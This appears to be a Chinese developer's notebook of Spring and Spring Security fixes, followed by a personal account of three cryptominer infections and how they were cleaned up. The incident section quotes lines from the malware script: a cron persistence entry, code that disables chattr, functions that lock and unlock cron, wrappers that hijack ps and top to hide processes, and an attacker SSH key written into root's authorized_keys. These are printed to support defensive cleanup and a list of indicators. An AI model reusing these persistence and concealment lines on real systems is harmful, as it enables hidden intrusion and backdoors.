# Spring获取请求Body中的数据问题

`@RequestParam`注解与`HTTPServletRequest`的`getParameter`方法接收的参数，当请求头中`Content-Type`为`application/x-www-form-urlencoded`，即`Content-Type`的默认属性时，如果采用`POST`方式请求，则无论数据放在`params`中还是`body`中，使用上面两个都可以获取到参数，如果使用`GET`方式请求，则参数==只能==放在`params`中。如果不使用`body`传递参数则可以不设置`Content-Type`且哪种请求方式都能获取到。

如果要接受`body`中的参数且`Content-Type`为`application/json`等格式时，建议使用`@RequestBody`注解添加在参数列表中获取body中指定键的信息，也可以使用如下方式获取：

```java
int contentLength = request.getContentLength();
String header = request.getHeader("Content-Type");
if (contentLength > 0&&header!=null) {
    ServletInputStream inputStream = request.getInputStream();
    byte[] buffer = new byte[contentLength];
    String s = new String(buffer);
}
```

如果传递的是一个JSON字符串，则s就是这个字符串

**==注意：只有一个Body所以只能有一个RequestBody注解，通过携带的键来获取指定数据==**

如果使用`ResuestBody`获取`Content-Type`为`application/x-www-form-urlencoded`的body数据，得到的是等号键值对：`key=value`

- form-data、x-www-form-urlencoded：不可以用@RequestBody；可以用@RequestParam。这两种方式的时候没有json字符串部分。

- application/json：json字符串部分可以用@RequestBody；url中的?后面参数可以用@RequestParam

**综上：要注意参数的位置不同，获取方式 也不同**

# 使用SpringSecurity抛出的UsernameNotFoundException无法被捕获，始终返回密码错误

原因：

`AbstractUserDetailsAuthenticationProvider`类中`hideUserNotFoundExceptions`属性默认为`true`，在此类的`authenticate`方法中：

```java
catch (UsernameNotFoundException ex) {
    this.logger.debug("Failed to find user '" + username + "'");
    if (!this.hideUserNotFoundExceptions) {
        throw ex;
    }
    throw new BadCredentialsException(this.messages
                                      .getMessage("AbstractUserDetailsAuthenticationProvider.badCredentials", "Bad credentials"));
}
```

导致抛出的异常均为密码错误异常

解决方法：

注册bean

```java
@Bean
public AuthenticationProvider daoAuthenticationProvider(){
    DaoAuthenticationProvider daoAuthenticationProvider = new DaoAuthenticationProvider();
    daoAuthenticationProvider.setUserDetailsService(userDetailsService);
    daoAuthenticationProvider.setPasswordEncoder(bCryptPasswordEncoder());
    daoAuthenticationProvider.setHideUserNotFoundExceptions(false);
    return daoAuthenticationProvider;
}
```

在SpringSecurity配置类中：

```java
@Override
protected void configure(AuthenticationManagerBuilder auth) throws Exception {
    super.configure(auth);
    auth.authenticationProvider(daoAuthenticationProvider());
}
```

但是有些玄学，一个项目只注册了bean就解决了这个问题，另一个项目两个都写了仍然全都是密码错误异常，目前没找到原因和解决方法

# 前后端分离时，SpringSecurity的配置

在SpringSecurity配置类中进行如下配置

- 关闭csrf保护，因为前后端分离项目必定会跨域，使用Nginx或其他技术实现代理跨域时，跨域保护会出问题，本项目中使用token完成验证，防止跨域安全问题
- 通过entryPoint指定如果不登录就请求对应URL的处理器，本项目中由于采用了全局过滤器以及token验证，此项配置意义不大
- 指定登录时的账号密码的name属性，默认url是`/login`
- 指定登录成功、失败时的处理器，在成功处理器中签发token
- 指定登出处理器，实际上登出操作只需要前端舍弃token即可，完善一下还可以向后端发送请求清空数据库中签发的token
- 添加全局拦截器，在`UsernamePasswordAuthenticationFilter`前添加，因为请求只携带token，一定会被SpringSecurity拦截，所以要在SpringSecurity介入前对请求头中的token进行判断

```java
http.csrf().disable();
http.exceptionHandling()
    .authenticationEntryPoint(entryPoint)
    .and()
    .formLogin()
    .usernameParameter("account")
    .passwordParameter("password")
    .successHandler(successHandler)
    .failureHandler(failureHandler)
    .and()
    .logout()
    .logoutSuccessHandler(logoutSuccessHandler);
http.addFilterBefore(globalFilter,UsernamePasswordAuthenticationFilter.class);
```

# 记被挖矿经历

### 第一次被黑

第一次是在做一个简单项目开发过程中，为了方便将Redis放开了IP限制可以随意连接且没有设置密码，因为服务器上还有一个自己做的空闲教室查询的后台，有一天在寻找自习室时发现无法访问查询服务，随即连接服务器查看情况，输入top命令，发现有一个名为`phpupgrade`的进程占用了所有的CPU，使用kill -9命令杀死该进程后过了几十秒此进程重新启动，使用`crontab -l`指令查看定时任务发现定时任务为空，说明后台还有一个唤醒程序，但是由于这个唤醒程序占用很低所以也就并没有出现在top命令中，于是在再次杀死这个挖矿进程后，使用top命令发现出现一个`phpguard`的程序，判定正是此程序不断重启挖矿进程，于是先杀死这个守卫进程再杀死挖矿进程，设置RedisIP限制，此次问题得以修复，但是由于此次被黑解决的很简单，也没有意识进行记录，但是没想到这还只是个开始。

### 第二次被黑

有一天突发奇想要学习一下postgresql，于是在服务器上安装了postgresql，由于postgresql安装的特殊性，这个数据库需要创建一个名为`postgres`的新用户，这就为第二次被黑埋下了伏笔(尽管已经使用了数字字母组合密码)，某日远程连接服务器时觉得异常卡顿，使用top命令发现一个高CPU占用率的进程，有了第一次的经验，首先查看定时任务依然没有发现，使用ps命令查看进程信息也没有找到这个进程，同样杀死一次隔一段时间还会重启，这时注意到此进程的发起者正是`postgres`，查看此账号的进程，果然发现了挖矿程序，切换到此账号后再次查看定时任务列表发现了定时重启任务，这样问题就得以解决：清空定时任务、杀死挖矿进程，但是postgresql还要继续使用，无奈，只能切换回root用户，调用`passwd -l postgres`锁定这个账号，这样此账号无法远程登录但是数据库还是可以正常使用

### 第三次被黑

这次还是redis，为了测试主从复制，为了方便的查看主库、从库中存储的内容，打算使用RedisDesktopManager进行可视化查看，最初认为只开放几分钟应该问题不大(我是真没想到无孔不入，艹)放开了redis IP限制，启动Redis后不到20秒，我在使用上述软件连接Redis服务器后发现里面居然有四个key(当时我就裂开了)，打开一个一看，value中赫然写着一条定时任务，就是下面这条

```sh
*/30 * * * * sh /etc/newinit.sh >/dev/null 2>&1
```

调用top和ps命令都无法看到高占用进程但是free命令确确实实告诉我内存不够用了，且定时任务列表crontab也不能编辑上面的脚本也无法删除，提示权限不足，无奈只好查看这个定时任务中的脚本内容

整个脚本共1018行，先从解决问题的方面说起，Linux命令：chattr

chattr命令用于修改Linux中文件的属性，语法如下

```sh
chattr [ -RVf ] [ -v version ] [ mode ] files...
```

一个通用格式是：+-=[aAcCdDeijsStTu]

‘+’选项，将给文件添加属性；‘-’选项，移除文件中的属性；‘=’选项，使得文件只有这些属性。

字母 'aAcCdDeijsStTu' 可以赋予文件的新属性：

- a：只能附加数据
- A：不修改访问时间
- c：压缩文件
- C：不执行写入时复制，多个调用者获取同一个资源，这时另一个调用者对这个资源进行了修改，不生成一个副本
- d：不 dump
- D: 同步更新目录
- e：extent格式（一种文件系统格式）
- i：不能修改。不能删除或重命名，不能创建到该文件的链接，也不能向该文件写入数据。只有超级用户或拥有 CAP_LINUX_IMMUTABLE 能力的进程才能设置或清除此属性。
- j：数据日志
- s：安全删除
- S：同步更新
- t：不知道文件尾部合并
- T：目录层次的顶部
- u：文件被删除时，其内容会被保存，后面可以请求恢复

下面的只读属性，可以使用 lsattr列出，但不能被 chattr 修改：

- E：压缩错误
- h：巨大的文件
- I：索引目录
- N：内联数据
- X：压缩原始访问
- Z：压缩文件是脏的

这里的主角主要是aiu三个参数，普通文件一般只有一个e表示，可以通过`lsattr *`查看当前目录下所有文件标识或`lsattr file`查看指定文件的标识

如何让一个文件只读？

```sh
chattr +i test.txt
```

上述指令为test.txt赋予了i标记，需要使用root账户或sudo

如何取消只读？

```sh
chattr -i test.txt
```

如何对一个路径下的所有文件作出限制？

```sh
chattr -R +i ./test-dir/
```

-R表示递归的改变目录及其内容的属性

上述指令会导致test-dir中所有文件都是只读的

有了上述理论基础后，使用`lsattr *`命令查看/etc/目录下所有文件的信息，发现数个带有-i标记的文件且创建日期就在开启Redis后，于是尝试使用chattr修改文件限制但是提示chattr权限不足，仔细查看脚本，发现第1003行与1004行有以下内容：

```sh
chmod 444 /usr/bin/chattr
chmod 444 /bin/chattr
```

该脚本将chattr设置为只读不可执行，这正是原因所在，由于定时任务仍然存在，只有三十秒的时间完成修改属性、删除脚本的操作，于是首先快速修改此脚本属性并执行rm指令将其删除（具体细节略有遗忘，但大体思路就这样）：

```sh
chmod 777 /usr/bin/chattr
chmod 777 /bin/chattr
chattr -ai /etc/newinit.sh
rm -rf /etc/newinit.sh
```

执行上述命令后成功删除脚本，至此算是打掉了挖矿程序的复活甲

接着同样先解锁定时任务删除被篡改的内容，在脚本中发现如下内容：

```sh
unlock_cron()
{
    chattr -R -ia /var/spool/cron
    chattr -ia /etc/crontab
    chattr -R -ia /var/spool/cron/crontabs
    chattr -R -ia /etc/cron.d
}

lock_cron()
{
    chattr -R +ia /var/spool/cron
    chattr +ia /etc/crontab
    chattr -R +ia /var/spool/cron/crontabs
    chattr -R +ia /etc/cron.d
}
```

论规范编码的重要性！把unlock中的语句执行一遍即可解锁定时任务，然后就能清空定时任务

然后问题来了，为什么ps命令与top命令无法查看到挖矿进程信息呢？

在脚本中存在如下语句

```sh
mv /bin/ps /bin/ps.original
echo "#! /bin/bash">>/bin/ps
echo "ps.original \$@ | grep -v \"zzh\|pnscan\"">>/bin/ps
chmod +x /bin/ps
```

```sh
mv /bin/top /bin/top.original
echo "#! /bin/bash">>/bin/top
echo "top.original \$@ | grep -v \"zzh\|pnscan\"">>/bin/top
chmod +x /bin/top
```

该脚本通过修改ps、top程序名并将带有过滤功能的脚本插入到新创建的ps、top文件且赋予可执行权限，劫持了ps命令和top命令，也就是说现在调用的是滤掉挖矿程序的ps和top命令，但是这也同时将两个关键进程暴露在我们面前，于是调用top.original就能看到真实的进程信息，杀死指定进程即可，然后删除etc目录中的`zzh`文件

此外这个脚本还改写了authorized_keys设置免密登录后门

```sh
chmod 700 /root/.ssh/
echo >> /root/.ssh/authorized_keys
chmod 600 /root/.ssh/authorized_keys
echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQC3QgqCevA1UIX9jkWJNzaDHmCFQMCVn6DlhT8Tj1CcBLouOPpuBVqGoZem9UT/sdy563H+e1cQD6LRA9lgyBO8VBOuyjlPf/rdYeXZRv9eFZ4ROGCOX/dvNzV9XdEyPX+znEL4AS45ko0obSqNGbserHPcKtXBjjcf9zWtRvBA4lteyXENWeCST61OhVI0K7bNTUHsQhFC0rgiGFqVv+kIwMVauMxeNd5PjsES4C5P9G8Ynligmdxp7LdOFeb5/V/iO8eceQsxLyXVCe2Jue5gaaOIbKy2j2HPxj6qK2BUqlx+dJdat6HE2HyPWDKD5jPyA5RCSs1zphe7BQjH20cX1nyzbhxNNQncs5BfB0kk2Qcb9IS/ofX9p8zIVKLUHMUNC9mKqPljzxH/3wYnOZrgebS4uwfyad+6SQ1oRfs1vWotXxSz1hBjhRPpUqzA7J865AcSOZBaoRsRKZ1BaGMyJyjIfkecFgeDpmbHzOzCjIXAeh20S2wLYZGdrhgVEr0= uc1" > /root/.ssh/authorized_keys
```

将这个文件内容清空即可，至此此次被黑基本解决，资源占用恢复正常

##### 总结这个脚本的功能

- 利用Docker Api未授权命令执行创建容器，并进一步下载执行名为trace的门罗币挖矿木马。（脚本中有相关语句但是这个脚本将安装docker这句给注释了，而这个服务器没有docker环境，所以没啥用）
- 会尝试卸载云主机安全软件，尝试结束清除其它竞品挖矿木马。（是的，还带卷的，专门有个函数kill_miner_proc()）
- 对ps，top，pstree等系统工具进行重命名和替换，进而通过劫持工具运行参数的方式，实现隐蔽挖矿
- 改写authorized_keys设置免密登录后门
- 木马会下载编译pnscan，masscan扫描工具

着重检查以下文件：

>*/etc/zzh
>/tmp/zzh
>/etc/strace
>/tmp/strace
>/tmp/hxx
>/tmp/ps*
>排查ps，top，pstree等工具文件是否被替换。

排查清理以下可疑进程

> zzh
> strace
> pnscan
> masscan
> hxx

建议：

>Redis 服务端口不要暴露在公网，使用强口令。
>配置SSH服务使用强口令。

# Spring Cloud项目中，通用模块存在Mybatis plus starter导致引用必须配置数据库的问题

由于mybatis-plus需要绑定实体类，所以在不需要配置数据库时，应当使用maven的`<exclusion>`标签去除mybatis-plus-starter依赖

# 新版本OpenFeign结合Hystrix的问题

由于hystrix已经进入维护状态，hystrix被移出了Spring Cloud Netflix，而Hystrix作为CircuitBreaker服务降级、熔断目前的唯一实现，所以`@EnableCircuitBreaker`过时了，但是在feign的fallback配置中，由原来的`feign.hystrix.enabled=true`变成了`feign.circuitbreaker=true`，相当于OpenFeign也去除了与Hystrix的关系
